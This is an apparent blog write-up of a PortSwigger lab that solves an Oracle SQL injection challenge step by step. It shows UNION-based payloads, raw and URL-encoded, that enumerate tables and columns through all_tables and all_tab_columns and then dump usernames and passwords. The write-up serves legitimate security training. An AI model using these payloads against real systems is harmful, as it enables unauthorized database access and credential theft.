---
layout: post
title: "SQL injection attack, listing the database contents on Oracle [Write-up]"
date: 2026-06-30
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection attack, listing the database contents on Oracle

**Platform:** PortSwigger

**Difficulty:** Medium  

---


# Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## Solution

First, let's try to trigger an error using `'`

<p align="center">
  <img src="/assets/css/img/SQL/sql11.png" alt="SQLi" />
</p>

```python
Pets'
```

We managed to trigger an error, so let's try to find out how many columns there are in the table

<p align="center">
  <img src="/assets/css/img/SQL/sql12.png" alt="SQLi" />
</p>

```python
Gifts' ORDER BY 1 --

URL:
Gifts'+ORDER+BY+1+--
Gifts'+ORDER+BY+2+--
Gifts'+ORDER+BY+3+--
```

On the third attempt, we encountered an error, which means there are only two columns in the table. 

So let's check what data types these columns have

<p align="center">
  <img src="/assets/css/img/SQL/sql13.png" alt="SQLi" />
</p>

```python
Pets' UNION SELECT 'HACK','LIVE' FROM DUAL --

URL:
Pets'+UNION+SELECT+'HACK','LIVE'+FROM+DUAL+--
```

Our request was successfully displayed, which confirms the vulnerability.

The next step is to find out the name of the table 

<p align="center">
  <img src="/assets/css/img/SQL/sql14.png" alt="SQLi" />
</p>

```python
Pets' UNION SELECT table_name,'LIVE' FROM all_tables --

URL:
Pets'+UNION+SELECT+table_name,'LIVE'+FROM+all_tables+--
```

After searching, we find a table named `USERS_GNPSUO`

Let's find the names of the columns in the table

<p align="center">
  <img src="/assets/css/img/SQL/sql15.png" alt="SQLi" />
</p>


```python
Pets' UNION SELECT column_name,'LIVE' FROM all_tab_columns WHERE table_name = 'USERS_GNPSUO' --

URL:
Pets'+UNION+SELECT+column_name,'LIVE'+FROM+all_tab_columns+WHERE+table_name+=+'USERS_GNPSUO'+--
```

We were able to find two columns titled `USERNAME_QJPUHM` and `PASSWORD_FWWZRD`

The final step will be to retrieve the contents from the table

<p align="center">
  <img src="/assets/css/img/SQL/sql16.png" alt="SQLi" />
</p>

```python
Pets' UNION SELECT USERNAME_QJPUHM, PASSWORD_FWWZRD FROM USERS_GNPSUO--

URL:
Pets'+UNION+SELECT+USERNAME_QJPUHM,+PASSWORD_FWWZRD+FROM+USERS_GNPSUO+--
```

We find the password for the administrator account, enter it in the login field, and complete the lab.

